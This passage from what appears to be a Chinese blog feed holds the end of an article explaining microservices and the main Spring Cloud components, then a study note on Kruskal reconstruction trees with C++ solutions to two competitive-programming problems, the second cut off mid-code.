&lt;p&gt;&lt;strong&gt;关键点：&lt;/strong&gt;复杂度可控，独立按需扩展，技术选型灵活，容错，可用性高&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul readability=&quot;6&quot;&gt;&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;它解决了复杂性的问题。它会将一种怪异的整体应用程序分解成一组服务。虽然功能总量 不变，但应用程序已分解为可管理的块或服务。每个服务都以RPC或消息驱动的API的形式定义了一个明确的边界；Microservice架构模式实现了一个模块化水平。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;这种架构使每个服务都能够由专注于该服务的团队独立开发。开发人员可以自由选择任何有用的技术，只要该服务符合API合同。当然大多数组织都希望避免完全无政府状态并限制技术选择。然而这种自由意味着开发人员不再有义务使用在新项目开始时存在的可能过时的技术。在编写新服务时，他们可以选择使用当前的技术。此外由于服务相对较小，使用当前技术重写旧服务变得可行。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;Microservice架构模式使每个微服务都能独立部署。开发人员不需要协调部署本地服务的变更。这些变化可以在测试后尽快部署。例如UI团队可以执行A | B测试，并快速迭代UI更改。Microservice架构模式使连续部署成为可能。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;Microservice架构模式使每个服务都可以独立调整。您可以仅部署满足其容量和可用性限制的每个服务的实例数。此外您可以使用最符合服务资源要求的硬件。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;微服务的缺点&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;&lt;strong&gt;关键点（挑战）：&lt;/strong&gt;多服务运维难度，系统部署依赖，服务间通信成本，数据一致性，系统集成测试，重复工作，性能监控等&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul readability=&quot;10.5&quot;&gt;&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;一个缺点是名称本身。术语microservice过度强调服务规模。但重要的是要记住，这是一种手段而不是主要目标。微服务的目标是充分分解应用程序以便于敏捷应用程序开发和部署。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;微服务器的另一个主要缺点是分布式系统而产生的复杂性。开发人员需要选择和实现基于消息传递或RPC的进程间通信机制。此外他们还必须编写代码来处理部分故障，因为请求的目的地可能很慢或不可用。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;微服务器的另一个挑战是分区数据库架构。更新多个业务实体的业务交易是相当普遍的。但是在基于微服务器的应用程序中，您需要更新不同服务所拥有的多个数据库。使用分布式事务通常不是一个选择，而不仅仅是因为CAP定理。许多今天高度可扩展的NoSQL数据库都不支持它们。你最终不得不使用最终的一致性方法，这对开发人员来说更具挑战性。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;测试微服务应用程序也更复杂。服务类似的测试类将需要启动该服务及其所依赖的任何服务（或至少为这些服务配置存根）。再次，重要的是不要低估这样做的复杂性。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;Microservice架构模式的另一个主要挑战是实现跨越多个服务的更改。例如我们假设您正在实施一个需要更改服务A，B和C的故事，其中A取决于B和B取决于C，在单片应用程序中您可以简单地更改相应的模块，整合更改并一次性部署。相比之下，在Microservice架构模式中，您需要仔细规划和协调对每个服务的更改。例如，您需要更新服务C，然后更新服务B，然后再维修A，幸运的是大多数更改通常仅影响一个服务，而需要协调的多服务变更相对较少。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;部署基于微服务的应用程序也更复杂。单一应用程序简单地部署在传统负载平衡器后面的一组相同的服务器上。每个应用程序实例都配置有基础架构服务（如数据库和消息代理）的位置（主机和端口）。相比之下，微服务应用通常由大量服务组成。例如每个服务将有多个运行时实例。更多的移动部件需要进行配置，部署，扩展和监控。此外您还需要实现服务发现机制，使服务能够发现需要与之通信的任何其他服务的位置（主机和端口）。传统的基于故障单和手动操作的方法无法扩展到这种复杂程度。因此，成功部署微服务应用程序需要开发人员更好地控制部署方法，并实现高水平的自动化。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;2-springcloud引入&quot;&gt;2. SpringCloud引入&lt;/h4&gt;
&lt;p&gt;SpringCloud并不是一个框架而是一个微服务整体架构，或者说SpringCloud是一个生态圈，里面包含了很多的服务，每一个服务独立存在，相互之间互不干扰，可以直接运行。&lt;/p&gt;
&lt;p&gt;其实SpringCloud就是一个完整的微服务架构，提供了所有功能，整个开发项目中所需要的架构功能微服务都有，也就是说整个springcloud就是一个完整的项目，这个架构已经搭建完毕了，用到了直接获取即可，只需要往架构中注入自己的业务代码就可以。&lt;/p&gt;
&lt;p&gt;它具有微服务的以下几大优势：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;
&lt;p&gt;复杂度可控&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;在将应用分解的同时，规避了原本复杂度无止境的积累。每一个微服务专注于单一功能，并通过定义良好的接口清晰表述服务边界。由于体积小、复杂度低，每个微服务可由一个小规模开发团队完全掌控，易于保持高可维护性和开发效率&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;独立部署&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;具备独立的运行进程，所以每个微服务也可以独立部署。&lt;/li&gt;
&lt;li&gt;当某个服务发生变更时无需编译、部署整个应用。&lt;/li&gt;
&lt;li&gt;由微服务组成的应用相当于具备一系列可并行的发布流程，使得发布更加高效，同时降低对生产环境所造成的风险，最终缩短应用交付周期&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;技术选型灵活&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;微服务架构下，技术选型是去中心化的。每个团队可以根据自身服务的需求和行业发展的现状，自由选择最适合的技术栈。&lt;/li&gt;
&lt;li&gt;由于每个微服务相对简单，故需要对技术栈进行升级时所面临的风险就较低，甚至完全重构一个微服务也是可行的&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;容错能力&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;在微服务架构下，故障会被隔离在单个服务中。若设计良好，其他服务可通过 重试、平稳退化等机制实现应用层面的容错&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;扩展性&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;每个服务可以根据实际需求独立进行扩展&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;3-springcloud五大组件浅析&quot;&gt;3. SpringCloud五大组件浅析&lt;/h4&gt;
&lt;h5 id=&quot;31-举例业务场景&quot;&gt;3.1 举例业务场景&lt;/h5&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/SpringCloud/20210120005132.png&quot; alt=&quot;image-20210120005132527&quot;/&gt;&lt;p&gt;如上图，假设现在开发一个电商网站，要实现支付订单功能流程如下&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;创建一个订单后，如果用户立刻支付了这个订单，我们需要将这个订单状态更新为&lt;code&gt;已支付&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;扣减相对应的商品库存&lt;/li&gt;
&lt;li&gt;通知仓储中心进行发货&lt;/li&gt;
&lt;li&gt;给用户这次购物添加加相对应的积分&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;针对上述流程我们需要有订单服务、库存服务、仓储服务、积分服务，整个流程的大体思路如下：&lt;/p&gt;
&lt;ul readability=&quot;1&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;用户针对一个订单完成支付后，就会去找订单服务，更新订单状态&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;订单服务调用库存服务，完成相应的功能&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;订单服务调用仓储服务，完成相应的功能&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;订单服务调用积分服务，完成相应的功能&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h5 id=&quot;32-服务发现---netflix-eureka（类似zookeeper）&quot;&gt;3.2 服务发现 - Netflix Eureka（类似zookeeper）&lt;/h5&gt;
&lt;p&gt;首先考虑一个问题，订单服务要调用库存服务、仓储服务、积分服务，如何调用呢？&lt;/p&gt;
&lt;p&gt;订单服务根本不知道上述服务在哪台服务器上，所以没法调用，而Eureka的作用就是来告诉订单服务它想调用的服务在哪台服务器上，Eureka有客户端和服务端，每一个服务上面都有Eureka客户端，可以把本服务的相关信息注册到Eureka服务端上，那么我们的订单服务就可以就可以找到库存服务、仓储服务、积分服务了&lt;/p&gt;
&lt;p&gt;我们上述的业务使用Eureka后如下图：&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/SpringCloud/20210120012526.png&quot; alt=&quot;image-20210120012525962&quot;/&gt;&lt;p&gt;总结：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Eurake客户端：负责将这个服务的信息注册到Eureka服务端中&lt;/li&gt;
&lt;li&gt;Eureka服务端：相当于一个注册中心，里面有注册表，注册表中保存了各个服务所在的机器和端口号，可通过Eureka服务端找到各个服务&lt;/li&gt;
&lt;/ul&gt;&lt;h5 id=&quot;33-webservice客户端feign（类似dubbo）&quot;&gt;3.3 WebService客户端Feign（类似Dubbo）&lt;/h5&gt;
&lt;p&gt;通过上面的Eureka，现在订单服务确实知道库存服务、积分服务、仓储服务在哪了，但是我们如何去调用这些服务呢，如果我们自己去写很多代码调用那就太麻烦了，而SpringCloud已经为我们准备好了一个核心组件：Feign，接下来看如何通过Feign让订单服务调用库存服务，注意Feign也是用在消费者端的。&lt;/p&gt;
&lt;p&gt;订单服务与仓库服务Service&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/SpringCloud/20210120015626.png&quot; alt=&quot;image-20210120015626539&quot;/&gt;&lt;p&gt;没有底层的建立连接、构造请求、解析响应的代码，直接就是用注解定义一个 FeignClient接口，然后调用那个接口就可以了。人家Feign Client会在底层根据你的注解，跟你指定的服务建立连接、构造请求、发起靕求、获取响应、解析响应，等等。这一系列脏活累活，人家Feign全给你干了。&lt;/p&gt;
&lt;p&gt;问题来了，Feign是如何做到的呢？其实Feign的一个机制就是使用了动态代理：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;首先，如果你对某个接口定义了@FeignClient注解，Feign就会针对这个接口创建一个动态代理&lt;/li&gt;
&lt;li&gt;接着你要是调用那个接口，本质就是会调用 Feign创建的动态代理，这是核心中的核心&lt;/li&gt;
&lt;li&gt;Feign的动态代理会根据你在接口上的@RequestMapping等注解，来动态构造出你要请求的服务的地址&lt;/li&gt;
&lt;li&gt;最后针对这个地址，发起请求、解析响应&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/SpringCloud/20210120020535.png&quot; alt=&quot;image-20210120020535084&quot;/&gt;&lt;h5 id=&quot;34-客服端负载均衡---netflix-ribbon&quot;&gt;3.4 客服端负载均衡 - Netflix Ribbon&lt;/h5&gt;
&lt;p&gt;上面可以通过Eureka可以找到服务，然后通过Feign去调用服务，但是如果有多台机器上面都部署了库存服务，我应该使用Feign去调用哪一台上面的服务呢，这个时候就需要Ribbon了，它在服务消费者端配置和使用，作用就是负载均衡，默认使用的负载均衡算法是轮询算法，Ribbon会从Eureka服务端中获取到对应的服务注册表，然后就知道相应服务的位置，然后Ribbon根据设计的负载均衡算法去选择一台机器，Feigin就会针对这些机器构造并发送请求。&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/SpringCloud/20210120021918.png&quot; alt=&quot;image-20210120021918660&quot;/&gt;&lt;h5 id=&quot;35-断路器---netflix-hystrix&quot;&gt;3.5 断路器 - Netflix Hystrix&lt;/h5&gt;
&lt;p&gt;在微服务架构里一个系统会有多个服务，以本文的业务场景为例：订单服务在一个业务流程里需要调用三个服务，现在假设订单服务自己最多只有100个线程可以处理请求，如果积分服务出错，每次订单服务调用积分服务的时候，都会卡住几秒钟，然后抛出—个超时异常。&lt;/p&gt;
&lt;p&gt;分析下这样会导致什么问题呢？如果系统在高并发的情况下，大量请求涌过来的时候，订单服务的100个线程会卡在积分服务这块，导致订单服务没有一个多余的线程可以处理请求，这种问题就是微服务架构中恐怖的服务器雪崩问题，这么多的服务互相调用要是不做任何保护的话，某一个服务挂掉会引起连锁反应导致别的服务挂掉。&lt;/p&gt;
&lt;p&gt;服务也不应该挂掉啊，我们只要让存储服务和仓储服务正常工作就可以了，至于积分服务我们后期可以手动给用户加上积分，这个时候就轮到Hystrix了，Hystrix是隔离、熔断以及降级的一个框架，说白了就是Hystrix会搞很多小线程池然后让这些小线程池去请求服务，返回结果，Hystrix相当于是个中间过滤区，如果我们的积分服务挂了，那我们请求积分服务直接就返回了，不需要等待超时时间结束抛出异常，这就是所谓的熔断，但是也不能啥都不干就返回啊，不然我们之后手动加积分咋整啊，那我们每次调用积分服务就在数据库里记录一条消息，这就是所谓的降级，Hystrix隔离、熔断和降级的全流程如下：&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/SpringCloud/20210120015200.png&quot; alt=&quot;image-20210120015200451&quot;/&gt;&lt;h5 id=&quot;36-服务网关---netflix-zuul-（类似于服务端的nginx）&quot;&gt;3.6 服务网关 - Netflix Zuul （类似于服务端的Nginx）&lt;/h5&gt;
&lt;p&gt;该组件是负责网络路由的，假设你后台部署了几百个服务，现在有个前端兄弟，人家请求是直接从浏览器那儿发过来的。打个比方：人家要请求一下库存服务，你难道还让人家记着这服务的名字叫做inventory-service，并且部署在5台机器上，就算人家肯记住这一个，那你后台可有几百个服务的名称和地址呢？难不成人家请求一个，就得记住一个？&lt;/p&gt;
&lt;p&gt;上面这种情况，压根儿是不现实的。所以一般微服务架构中都必然会设计一个网关在里面，像android、ios、pc前端、微信小程序、H5等等，不用去关心后端有几百个服务，就知道有一个网关，所有请求都往网关走，网关会根据请求中的一些特征，将请求转发给后端的各个服务。&lt;/p&gt;
&lt;h5 id=&quot;37-总结&quot;&gt;3.7 总结&lt;/h5&gt;
&lt;ul&gt;&lt;li&gt;Eureka：服务启动的时候，服务上的Eureka客户端会把自身注册到Eureka服务端，并且可以通过Eureka服务端知道其他注册的服务。&lt;/li&gt;
&lt;li&gt;Ribbon：服务间发起请求的时候，服务消费者方基于Ribbon服务做到负载均衡，从服务提供者存储的多台机器中选择一台，如果一个服务只在一台机器上面，那就用不到Ribbon选择机器了，如果有多台机器，那就需要使用Ribbon选择之后再去使用。&lt;/li&gt;
&lt;li&gt;Feign：Feign使用的时候会集成Ribbon，Ribbon去Eureka服务端中找到服务提供者的所在的服务器信息，然后根据随机策略选择一个，拼接Url地址后发起请求。&lt;/li&gt;
&lt;li&gt;Hystrix：发起的请求是通过Hystrix的线程池去访问服务，不同的服务通过不同的线程池，实现了不同的服务调度隔离，如果服务出现故障，通过服务熔断，避免服务雪崩的问题 ，并且通过服务降级，保证可以手动实现服务正常功能。&lt;/li&gt;
&lt;li&gt;Zuul：如果前端调用后台系统，统一走zull网关进入，通过zull网关转发请求给对应的服务。&lt;/li&gt;
&lt;/ul&gt;</description>
<pubDate>Wed, 20 Jan 2021 00:21:00 +0000</pubDate>
<dc:creator>MPolaris</dc:creator>
<og:description>1. 微服务架构 1.1 微服务架构理解 微服务架构（Microservice Architecture）是一种架构概念，旨在通过将功能分解到各个离散的服务中以实现对解决方案的解耦。你可以将其看作是在</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/mpolaris/p/14300886.html</dc:identifier>
</item>
<item>
<title>kruskal重构树学习笔记 - liuchanglc</title>
<link>http://www.cnblogs.com/liuchanglc/p/14301009.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/liuchanglc/p/14301009.html</guid>
<description>&lt;h2 id=&quot;内容&quot;&gt;内容&lt;/h2&gt;
&lt;p&gt;按照 &lt;span class=&quot;math inline&quot;&gt;\(kruskal\)&lt;/span&gt; 算法的流程，把最小/大生成树中边权的关系映射到了一颗二叉树上&lt;/p&gt;
&lt;p&gt;具体实现也很简单&lt;/p&gt;
&lt;p&gt;在原本的 &lt;span class=&quot;math inline&quot;&gt;\(kruskal\)&lt;/span&gt; 算法中，每次查到两个不在同一集合的点，就新开一个节点&lt;/p&gt;
&lt;p&gt;然后把两个节点的祖先节点分别向新节点连边，不计边权，但是要记录新点的点权，就是连接两个点的边的边权&lt;/p&gt;
&lt;p&gt;新生成的树有以下特点&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math inline&quot;&gt;\(1\)&lt;/span&gt;、这棵树是一棵二叉树，且具有堆的性质。&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math inline&quot;&gt;\(2\)&lt;/span&gt;、树上除了叶子节点是原来的点，其余的点都是新建的点，且都有权值。&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math inline&quot;&gt;\(3\)&lt;/span&gt;、两个点 &lt;span class=&quot;math inline&quot;&gt;\(u\)&lt;/span&gt; 和 &lt;span class=&quot;math inline&quot;&gt;\(v\)&lt;/span&gt; 的 &lt;span class=&quot;math inline&quot;&gt;\(lca\)&lt;/span&gt; 的点权就对应着它们最小生成树上的路径上的最小/大值（瓶颈）&lt;/p&gt;
&lt;p&gt;这样，我们就可以解决从某一个点出发，只能经过边权小于/大于 &lt;span class=&quot;math inline&quot;&gt;\(x\)&lt;/span&gt; 的边，在所有能到达的点中查询最值的问题&lt;/p&gt;
&lt;p&gt;因为每遇到一个生成树上的边我们就会新开一个节点，所以节点数变为了原图的 &lt;span class=&quot;math inline&quot;&gt;\(2\)&lt;/span&gt; 倍&lt;/p&gt;
&lt;h2 id=&quot;p4768-noi2018-归程&quot;&gt;P4768 [NOI2018] 归程&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://www.luogu.com.cn/problem/P4768&quot; target=&quot;_blank&quot;&gt;题目传送门&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;分析&quot;&gt;分析&lt;/h3&gt;
&lt;p&gt;可以说是 &lt;span class=&quot;math inline&quot;&gt;\(kruskal\)&lt;/span&gt; 重构树的板子题&lt;/p&gt;
&lt;p&gt;首先按照边权从大到小排序，构建 &lt;span class=&quot;math inline&quot;&gt;\(kruskal\)&lt;/span&gt; 重构树&lt;/p&gt;
&lt;p&gt;这样，重构树就是一个小根堆&lt;/p&gt;
&lt;p&gt;因为每次询问时海拔大于 &lt;span class=&quot;math inline&quot;&gt;\(a\)&lt;/span&gt; 的边都可以乘车通过&lt;/p&gt;
&lt;p&gt;所以我们肯定要在 &lt;span class=&quot;math inline&quot;&gt;\(v\)&lt;/span&gt; 能乘车到达的点中选择到 &lt;span class=&quot;math inline&quot;&gt;\(1\)&lt;/span&gt; 的最短路最短的点&lt;/p&gt;
&lt;p&gt;在重构树上，我们只需要维护一个倍增数组&lt;/p&gt;
&lt;p&gt;查询时倍增跳到第一个深度小于等于 &lt;span class=&quot;math inline&quot;&gt;\(a\)&lt;/span&gt; 的祖先节点&lt;/p&gt;
&lt;p&gt;这个节点的子树中的所有点一定可以由 &lt;span class=&quot;math inline&quot;&gt;\(x\)&lt;/span&gt; 乘车到达&lt;/p&gt;
&lt;p&gt;只要在这棵子树中查询到 &lt;span class=&quot;math inline&quot;&gt;\(1\)&lt;/span&gt; 的最短路的最小值就行了&lt;/p&gt;
&lt;h3 id=&quot;代码&quot;&gt;代码&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;#include&amp;lt;cstdio&amp;gt;
#include&amp;lt;cmath&amp;gt;
#include&amp;lt;algorithm&amp;gt;
#include&amp;lt;vector&amp;gt;
#include&amp;lt;queue&amp;gt;
#include&amp;lt;cstring&amp;gt;
#define rg register
inline int read(){
        rg int x=0,fh=1;
        rg char ch=getchar();
        while(ch&amp;lt;'0' || ch&amp;gt;'9'){
                if(ch=='-') fh=-1;
                ch=getchar();
        }
        while(ch&amp;gt;='0' &amp;amp;&amp;amp; ch&amp;lt;='9'){
                x=(x&amp;lt;&amp;lt;1)+(x&amp;lt;&amp;lt;3)+(ch^48);
                ch=getchar();
        }
        return x*fh;
}
const int maxn=1e6+5;
int h[maxn],tot=1,n,m,q,k,s,t,dis[maxn],cnt,fa[maxn],val[maxn];
struct Node{
        int zb,yb,val;
        Node(){}
        Node(rg int aa,rg int bb,rg int cc){
                zb=aa,yb=bb,val=cc;
        }
}jl[maxn];
bool cmp(rg Node aa,rg Node bb){
        return aa.val&amp;gt;bb.val;
}
int zhao(rg int xx){
        if(xx==fa[xx]) return xx;
        return fa[xx]=zhao(fa[xx]);
}
struct asd{
        int to,nxt,val;
}b[maxn];
void ad(rg int aa,rg int bb,rg int cc){
        b[tot].to=bb;
        b[tot].nxt=h[aa];
        b[tot].val=cc;
        h[aa]=tot++;
}
bool vis[maxn];
struct jie{
        int num,jl;
        jie(){}
        jie(rg int aa,rg int bb){
                num=aa,jl=bb;
        }
        bool operator &amp;lt;(const jie&amp;amp; A)const{
                return jl&amp;gt;A.jl;
        }
};
void dij(){
        std::priority_queue&amp;lt;jie&amp;gt; Q;
        memset(dis,0x3f,sizeof(dis));
        memset(vis,0,sizeof(vis));
        dis[1]=0;
        Q.push(jie(1,0));
        while(!Q.empty()){
                rg int now=Q.top().num;
                Q.pop();
                if(vis[now]) continue;
                vis[now]=1;
                for(rg int i=h[now];i!=-1;i=b[i].nxt){
                        rg int u=b[i].to;
                        if(dis[u]&amp;gt;dis[now]+b[i].val){
                                dis[u]=dis[now]+b[i].val;
                                Q.push(jie(u,dis[u]));
                        }
                }
        }
}
int dep[maxn],mindis[maxn],zx[maxn][22],mmin[maxn][22];
std::vector&amp;lt;int&amp;gt; g[maxn];
void dfs(rg int now,rg int lat){
        dep[now]=dep[lat]+1;
        mindis[now]=dis[now];
        mmin[now][0]=val[lat];
        zx[now][0]=lat;
        for(rg int i=1;(1&amp;lt;&amp;lt;i)&amp;lt;=dep[now];i++){
                zx[now][i]=zx[zx[now][i-1]][i-1];
                mmin[now][i]=std::min(mmin[now][i-1],mmin[zx[now][i-1]][i-1]);
        }
        for(rg int i=0;i&amp;lt;g[now].size();i++){
                rg int u=g[now][i];
                dfs(u,now);
                mindis[now]=std::min(mindis[now],mindis[u]);
        }
}
int latans;
int solve(rg int now,rg int val){
        for(rg int i=20;i&amp;gt;=0;i--){
                if(mmin[now][i]&amp;gt;val){
                        now=zx[now][i];
                }
        }
        return mindis[now];
}
int main(){
        t=read();
        while(t--){
                memset(dep,0,sizeof(dep));
                memset(h,-1,sizeof(h));
                memset(mmin,0,sizeof(mmin));
                memset(zx,0,sizeof(zx));
                tot=1,latans=0;
                n=read(),m=read();
                rg int aa,bb,cc,dd;
                for(rg int i=1;i&amp;lt;=m;i++){
                        aa=read(),bb=read(),cc=read(),dd=read();
                        jl[i]=Node(aa,bb,dd);
                        ad(aa,bb,cc),ad(bb,aa,cc);
                }       
                dij();
                cnt=n;
                std::sort(jl+1,jl+m+1,cmp);
                for(rg int i=1;i&amp;lt;=n+n;i++) fa[i]=i;
                for(rg int i=1;i&amp;lt;=n+n;i++) g[i].clear();
                for(rg int i=1;i&amp;lt;=m;i++){
                        aa=jl[i].zb,bb=jl[i].yb,cc=jl[i].val;
                        aa=zhao(aa),bb=zhao(bb);
                        if(aa==bb) continue;
                        val[++cnt]=cc;
                        fa[aa]=fa[bb]=cnt;
                        g[cnt].push_back(aa),g[cnt].push_back(bb);
                }
                dfs(cnt,0);
                q=read(),k=read(),s=read();
                for(rg int i=1;i&amp;lt;=q;i++){
                        aa=read(),bb=read();
                        aa=(aa+k*latans-1)%n+1;
                        bb=(bb+k*latans)%(s+1);
                        printf(&quot;%d\n&quot;,latans=solve(aa,bb));
                }
        }
        return 0;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;p4197-peaks&quot;&gt;P4197 Peaks&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://www.luogu.com.cn/problem/P4197&quot; target=&quot;_blank&quot;&gt;题目传送门&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;分析-1&quot;&gt;分析&lt;/h3&gt;
&lt;p&gt;还是 &lt;span class=&quot;math inline&quot;&gt;\(kruskal\)&lt;/span&gt; 重构树的板子题&lt;/p&gt;
&lt;p&gt;按照边权从小到大排序构建重构树&lt;/p&gt;
&lt;p&gt;查询的时候只需要在祖先节点对应的主席树里查询 &lt;span class=&quot;math inline&quot;&gt;\(k\)&lt;/span&gt; 大就行了&lt;/p&gt;
&lt;p&gt;因为只有询问子树的操作，所以可以按照 &lt;span class=&quot;math inline&quot;&gt;\(dfn\)&lt;/span&gt; 序进行处理&lt;/p&gt;
&lt;h3 id=&quot;代码-1&quot;&gt;代码&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;#include&amp;lt;cstdio&amp;gt;
#include&amp;lt;cmath&amp;gt;
#include&amp;lt;algorithm&amp;gt;
#include&amp;lt;vector&amp;gt;
#include&amp;lt;queue&amp;gt;
#include&amp;lt;cstring&amp;gt;
#define rg register
inline int read(){
        rg int x=0,fh=1;
        rg char ch=getchar();
        while(ch&amp;lt;'0' || ch&amp;gt;'9'){
                if(ch=='-') fh=-1;
                ch=getchar();
        }
        while(ch&amp;gt;='0' &amp;amp;&amp;amp; ch&amp;lt;='9'){
                x=(x&amp;lt;&amp;lt;1)+(x&amp;lt;&amp;lt;3)+(ch^48);
                ch=getchar();
        }
        return x*fh;
}
const int maxn=4e5+5,maxm=5e5+5;
int h[maxn],tot=1,fa[maxn],n,m,q,val[maxn],cnt,hig[maxn];
struct Node{
        int zb,yb,val;
        Node(){}
        Node(rg int aa,rg int bb,rg int cc){
                zb=aa,yb=bb,val=cc;
        }
}jl[maxm];
bool cmp(rg Node aa,rg Node bb){
        return aa.val&amp;lt;bb.val;
}
struct asd{
        int to,nxt;
}b[maxn&amp;lt;&amp;lt;1];
void ad(rg int aa,rg int bb){
        b[tot].to=bb;
        b[tot].nxt=h[aa];
        h[aa]=tot++;
}
int zhao(rg int xx){
        if(xx==fa[xx]) return xx;
        return fa[xx]=zhao(fa[xx]);
}
int zx[maxn][22],mmax[maxn][22],dep[maxn],rt[maxn],rtcnt;
struct trr{
        int lch,rch,siz;
}tr[maxn*50];
int ad(rg int da,rg int pre,rg int l,rg int r,rg int wz){
        da=++rtcnt;
        tr[da]=tr[pre];
        tr[da].siz++;
        if(l==r) return da;
        rg int mids=(l+r)&amp;gt;&amp;gt;1;
        if(wz&amp;lt;=mids) tr[da].lch=ad(tr[da].lch,tr[pre].lch,l,mids,wz);
        else tr[da].rch=ad(tr[da].rch,tr[pre].rch,mids+1,r,wz);
        return da;
}
int cx(rg int da,rg int pre,rg int l,rg int r,rg int kth){
        if(l==r) return l;
        rg int mids=(l+r)&amp;gt;&amp;gt;1,nsiz=tr[tr[da].rch].siz-tr[tr[pre].rch].siz;
        if(nsiz&amp;gt;=kth) return cx(tr[da].rch,tr[pre].rch,mids+1,r,kth);
        else return cx(tr[da].lch,tr[pre].lch,l,mids,kth-nsiz);
}
int getlca(rg int xx,rg int yy){
        if(dep[xx]&amp;lt;dep[yy]) std::swap(xx,yy);
        rg int len=dep[xx]-dep[yy],k=0;
        while(len){
                if(len&amp;amp;1) xx=zx[xx][k];
                k++,len&amp;gt;&amp;gt;=1;
        }
        if(xx==yy) return xx;
        for(rg int i=20;i&amp;gt;=0;i--){
                if(zx[xx][i]!=zx[yy][i]){
                        xx=zx[xx][i],yy=zx[yy][i];
                }
        }
        return zx[xx][0];
}
int dfn[maxn],dfnc,siz[maxn],rk[maxn],sta[maxn],tp;
void dfs(rg int now,rg int lat){
        dep[now]=dep[lat]+1;
        zx[now][0]=lat;
        mmax[now][0]=val[lat];
        dfn[now]=++dfnc;
        rk[dfnc]=now;
        siz[now]=1;
        for(rg int i=1;(1&amp;lt;&amp;lt;i)&amp;lt;=dep[now];i++){
                zx[now][i]=zx[zx[now][i-1]][i-1];
                mmax[now][i]=std::max(mmax[now][i-1],mmax[zx[now][i-1]][i-1]);
        }
        for(rg int i=h[now];i!=-1;i=b[i].nxt){
                rg int u=b[i].to;
                if(u==lat) continue;
                dfs(u,now);
                siz[now]+=siz[u];
        }
}
int zhao(rg int now,rg int val){
        for(rg int i=20;i&amp;gt;=0;i--){
                if(mmax[now][i]&amp;lt;=val &amp;amp;&amp;amp; zx[now][i]){
                        now=zx[now][i];
                }
        }
        return now;
}
int solve(rg int xx,rg int yy,rg int kth){
        rg int lca=zhao(xx,yy);
        if(tr[rt[dfn[lca]+siz[lca]-1]].siz-tr[rt[dfn[lca]-1]].siz&amp;lt;kth) return -1;
        return sta[cx(rt[dfn[lca]+siz[lca]-1],rt[dfn[lca]-1],1,tp,kth)];
}
int main(){
        memset(mmax,0x3f,sizeof(mmax));
        memset(h,-1,sizeof(h));
        n=read(),m=read(),q=read();
        for(rg int i=1;i&amp;lt;=n;i++) hig[i]=read();
        for(rg int i=1;i&amp;lt;=n;i++) sta[++tp]=hig[i];
        std::sort(sta+1,sta+1+tp);
        tp=std::unique(sta+1,sta+1+tp)-sta-1;
